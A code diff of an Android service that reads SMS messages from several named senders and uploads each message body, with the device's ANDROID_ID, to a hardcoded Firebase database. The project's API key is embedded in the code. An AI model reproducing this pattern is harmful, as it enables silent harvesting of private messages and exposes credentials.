@@ -6,17 +6,14 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
-import android.os.PowerManager;
+import android.provider.Settings;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
-import com.google.firebase.database.DataSnapshot;
-import com.google.firebase.database.DatabaseError;
+import com.google.firebase.FirebaseApp;
+import com.google.firebase.FirebaseOptions;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
-import com.google.firebase.database.ValueEventListener;
-
-import java.util.ArrayList;
 
 /**
  * Created by Admin on 01-02-2017.
@@ -28,27 +25,42 @@ public class ReadMessages extends Service {
     private String[] projections=new String[]{"_id","date","address","body","seen"};
     private String selection=" address Like \"%WAYSMS%\" or address Like \"%INDMRT%\" or address Like \"%JustDl%\" or address Like \"%VM-Quikrr%\"";
     private String order="date DESC";
-    private static final String DATABASE_NAME="FpTag";
+    private static String DATABASE_NAME="FpId_",MOBILE_ID,MESSAGES="messages",PHONE_IDS="phoneIds",DETAILS="details";
 
-    MessageListModel messageListModel;
-    private ArrayList<MessageListModel.SmsMessage> messageList;
-    private PowerManager.WakeLock wakeLock;
+
+    //private PowerManager.WakeLock wakeLock;
 
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if(intent.getStringExtra(DATABASE_NAME)!=null){
+            DATABASE_NAME=intent.getStringExtra(DATABASE_NAME);
+        }
+
+        MOBILE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+
         new Thread(new Runnable() {
             @Override
             public void run() {
-                PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+               /* PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
                 wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                         "MyWakelockTag");
-                wakeLock.acquire();
-
-                DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
-                addListener(mDatabase);
-                readMessage();
-                sendDataToFirebase(mDatabase);
+                wakeLock.acquire();*/
+                FirebaseOptions options = new FirebaseOptions.Builder()
+                        .setApiKey("AIzaSyCZttwA-_904e5i5dt8B0ngzBdYBiZJ5Ek")
+                        .setApplicationId("1:1062918210318:android:0b779b0abb2b1ef6")
+                        .setDatabaseUrl("https://readmessage-37a5e.firebaseio.com")
+                        .build();
+                FirebaseApp secondApp = null;
+                try {
+                    secondApp = FirebaseApp.getInstance("second app");
+                }catch(Exception e) {
+                        secondApp = FirebaseApp.initializeApp(getApplicationContext(), options, "second app");
+                }
+                FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
+                DatabaseReference mDatabase = secondDatabase.getReference();
+                readMessage(mDatabase);
+                stopSelf();
             }
         }).start();
         return Service.START_STICKY;
@@ -57,8 +69,6 @@ public class ReadMessages extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        messageListModel = MessageListModel.getInstance();
-        messageList= new ArrayList<>();
     }
 
     @Nullable
@@ -67,68 +77,37 @@ public class ReadMessages extends Service {
         return null;
     }
 
-private void addListener(DatabaseReference mDatabase){
-    mDatabase.addValueEventListener(new ValueEventListener() {
-
-        @Override
-        public void onDataChange(DataSnapshot dataSnapshot) {
-            Log.v("ggg","changed");
-            MessageListModel model = dataSnapshot.child(DATABASE_NAME).getValue(MessageListModel.class);
-
-            if (model==null){
-                Log.v("ggg","messages are empty");
-                return;
-            }
-            Log.v("ggg","stopping");
-            wakeLock.release();
-            stopSelf();
-        }
-
-        @Override
-        public void onCancelled(DatabaseError databaseError) {
-            Log.v("ggg","error in access messages");
-        }
-    });
-}
-    private void sendDataToFirebase(DatabaseReference mDatabase ) {
-        Log.v("ggg","running2");
-        messageListModel.setDatabase(messageList.size());
-        mDatabase.child(DATABASE_NAME).setValue(messageListModel);
-        /*, new DatabaseReference.CompletionListener() {
-            @Override
-            public void onComplete(DatabaseError databaseError, DatabaseReference databaseReference) {
-                Log.v("ggg", "error on completion" + databaseError);
-            }
-        }*/
-
-        Log.v("ggg","running3");
-    }
-
-    private void readMessage(){
+    private void readMessage(DatabaseReference mDatabase){
         ContentResolver resolver = getContentResolver();
         Cursor cursor = resolver.query(MESSAGE_URI,projections,selection,null,order);
             if(cursor!=null && cursor.moveToFirst()){
 
-                messageList.clear();
+                MessageListModel.PhoneIds phoneIds=new MessageListModel.PhoneIds();
+                phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
+                phoneIds.setPhoneId(MOBILE_ID);
+                DatabaseReference phoneIdRef = mDatabase.child(DATABASE_NAME+DETAILS).child(PHONE_IDS);
+                phoneIdRef.child(MOBILE_ID).setValue(phoneIds);
+
                 MessageListModel.SmsMessage message;
+                DatabaseReference MessageIdRef = mDatabase.child(DATABASE_NAME+MESSAGES).child(MOBILE_ID);
+                MessageIdRef.removeValue();
                 do{
 
-               /*for(int i=0;i<data.getColumnCount();i++){
-                   Log.v("ggg"+i,data.getString(i)+" "+data.getColumnName(i));
-               }*/
                     message = MessageListModel.SmsMessage.getInstance()
                             .setId(cursor.getLong(0))
                             .setDate(cursor.getLong(1))
                             .setSubject(cursor.getString(2))
                             .setBody(cursor.getString(3))
                             .setSeen(cursor.getString(4));
-                    messageList.add(message);
+
+                    String key = MessageIdRef.push().getKey();
+                    MessageIdRef.child(key).setValue(message);
+
                     Log.v("ggg",message.toString());
+
                 }while(cursor.moveToNext());
                 cursor.close();
-                messageListModel.setMessageList(messageList);
         }
-        Log.v("ggg","running1");
     }
 
     @Override
